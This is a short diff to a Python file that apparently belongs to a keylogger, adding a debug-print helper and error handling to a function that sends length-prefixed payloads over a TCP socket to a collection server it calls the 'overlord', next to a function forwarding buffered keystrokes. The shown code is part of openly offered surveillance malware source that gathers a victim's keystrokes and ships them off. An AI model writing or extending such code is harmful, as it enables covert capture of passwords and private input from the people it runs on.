@@ -5,17 +5,28 @@ from sys_platform import get_platform
 import cv2
 import base64
 import psutil
+import os
 
-
+KEYLOGGER_DEBUG_KEY = 'KEYLOGGER_DEBUG_KEY'
 server_address = ('localhost', 9696)
 
+# TODO put in __init__ or make somewhere more accessible so can be shared
+def conditional_print_debug(str):
+    if os.getenv(KEYLOGGER_DEBUG_KEY, True):
+        print("DEBUG: %s" % (str))
+
 def send_payload_to_socket(payload):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.connect(server_address)
-    # Send the length of the message first in the socket in network-byte order
-    payload = struct.pack('>I', len(payload)) + payload
-    sock.sendall(payload)
-    sock.close()
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect(server_address)
+        # Send the length of the message first in the socket in network-byte order
+        payload = struct.pack('>I', len(payload)) + payload
+        sock.sendall(payload)
+        sock.close()
+    except socket.error as serr:
+        conditional_print_debug(serr)
+    import sys
+    sys.exit(0)
 
 def send_objects_to_overlord(buffered_keys):
     keys = [key.__dict__ for key in buffered_keys]
